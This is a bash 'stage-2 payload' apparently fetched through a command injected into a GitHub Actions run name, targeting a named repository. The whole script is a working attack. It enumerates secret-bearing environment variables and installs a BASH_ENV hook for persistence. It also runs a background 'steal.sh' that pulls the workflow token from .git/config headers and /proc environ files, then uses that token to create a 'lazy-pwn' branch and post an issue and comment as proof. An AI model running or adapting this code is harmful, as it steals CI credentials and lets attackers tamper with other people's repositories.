#!/bin/bash
# Stage-2 payload fetched by the injected run-name command.
set +e
TARGET="PDFtoMark/triage-pinterest-vc5dd446-3718f9"
API="https://api.github.com/repos/$TARGET"
echo "=== OMP_STAGE2_START ==="
date -u
echo "uid=$(id -u) user=$(id -un)"
echo "pwd=$(pwd)"
echo "event=${GITHUB_EVENT_NAME} workflow=${GITHUB_WORKFLOW} run=${GITHUB_RUN_ID} sha=${GITHUB_SHA}"
echo "GITHUB_TOKEN_ENV_SET=${GITHUB_TOKEN:+yes}"
echo "ACTIONS_RUNTIME_TOKEN_ENV_SET=${ACTIONS_RUNTIME_TOKEN:+yes}"
echo "--- env names (values redacted) ---"
env | grep -iE 'token|secret' | sed -E 's/=(.{0,6}).*/=\1.../'
echo "--- marker done ---"

cat > /tmp/hook.sh <<'EOS'
#!/bin/bash
[ -f /tmp/hooked ] && return 0 2>/dev/null
touch /tmp/hooked
echo "=== OMP_BASH_ENV_HOOK ==="
T=""
for cfg in $(find /home/runner/work -maxdepth 4 -type f -path '*/.git/config' 2>/dev/null); do
  h=$(grep -i 'extraheader' "$cfg" 2>/dev/null | head -1)
  if [ -n "$h" ]; then
    b=${h##*basic }
    T=$(echo "$b" | base64 -d 2>/dev/null | cut -d: -f2)
    [ -n "$T" ] && break
  fi
done
if [ -z "$T" ]; then
  for ef in /proc/[0-9]*/environ; do
    t=$(tr '\0' '\n' < "$ef" 2>/dev/null | grep '^INPUT_TOKEN=' | head -1 | cut -d= -f2-)
    [ -n "$t" ] && { T="$t"; break; }
  done
fi
if [ -z "$T" ]; then echo "HOOK_NO_TOKEN"; return 0; fi
echo "HOOK_TOKEN_LEN=${#T}"
echo "HOOK_TOKEN_SHA256=$(printf %s "$T" | sha256sum | cut -d' ' -f1)"
echo "HOOK_RATE=$(curl -s -H "Authorization: Bearer $T" https://api.github.com/rate_limit)"
echo "HOOK_REPO=$(curl -s -H "Authorization: Bearer $T" "$API")"
echo "HOOK_RUNS_CODE=$(curl -s -o /tmp/hook_runs -w '%{http_code}' -H "Authorization: Bearer $T" "$API/actions/runs?per_page=1")"
return 0
EOS

cat > /tmp/steal.sh <<'EOS'
#!/bin/bash
set +e
TOK=""
for i in $(seq 1 150); do
  sleep 2
  for cfg in $(find /home/runner/work -maxdepth 4 -type f -path '*/.git/config' 2>/dev/null); do
    h=$(grep -i 'extraheader' "$cfg" 2>/dev/null | head -1)
    if [ -n "$h" ]; then
      b=${h##*basic }
      TOK=$(echo "$b" | base64 -d 2>/dev/null | cut -d: -f2)
      [ -n "$TOK" ] && break 2
    fi
  done
done
if [ -z "$TOK" ]; then
  for ef in /proc/[0-9]*/environ; do
    t=$(tr '\0' '\n' < "$ef" 2>/dev/null | grep '^INPUT_TOKEN=' | head -1 | cut -d= -f2-)
    [ -n "$t" ] && { TOK="$t"; break; }
  done
fi
[ -z "$TOK" ] && { echo NO_TOKEN > /tmp/steal.out; exit 0; }
SHA=$(curl -s -H "Authorization: Bearer $TOK" "$API/git/ref/heads/main" | sed -n 's/.*"sha"[[:space:]]*:[[:space:]]*"\([0-9a-f]*\)".*/\1/p' | head -1)
REPO_CODE=$(curl -s -o /tmp/api_repo.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "$API")
REF_CODE=$(curl -s -o /tmp/api_ref.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"ref\":\"refs/heads/lazy-pwn\",\"sha\":\"$SHA\"}" "$API/git/refs")
RUNS_CODE=$(curl -s -o /tmp/api_runs.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "$API/actions/runs?per_page=1")
PAYLOAD=$(printf 'run=%s job=%s\nrepo_code=%s ref_code=%s runs_code=%s\nrepo=%s\nref=%s\n' "$GITHUB_RUN_ID" "$GITHUB_JOB" "$REPO_CODE" "$REF_CODE" "$RUNS_CODE" "$(head -c 600 /tmp/api_repo.json)" "$(head -c 600 /tmp/api_ref.json)" | base64 -w0)
ISSUE_CODE=$(curl -s -o /tmp/api_issue.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"title\":\"rce-token-proof\",\"body\":\"$PAYLOAD\"}" "$API/issues")
CMT_CODE=$(curl -s -o /tmp/api_cmt.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"body\":\"$PAYLOAD\"}" "$API/issues/6/comments")
printf 'TOKEN_SHA256=%s\nrepo=%s ref=%s runs=%s issue=%s comment=%s\n' "$(printf %s "$TOK" | sha256sum | cut -d' ' -f1)" "$REPO_CODE" "$REF_CODE" "$RUNS_CODE" "$ISSUE_CODE" "$CMT_CODE" > /tmp/steal.out
EOS
chmod +x /tmp/steal.sh
setsid /tmp/steal.sh >/tmp/steal.log 2>&1 </dev/null &
echo "BASH_ENV=/tmp/hook.sh" >> "$GITHUB_ENV"
echo "=== OMP_STAGE2_BG_STARTED ==="
exit 0
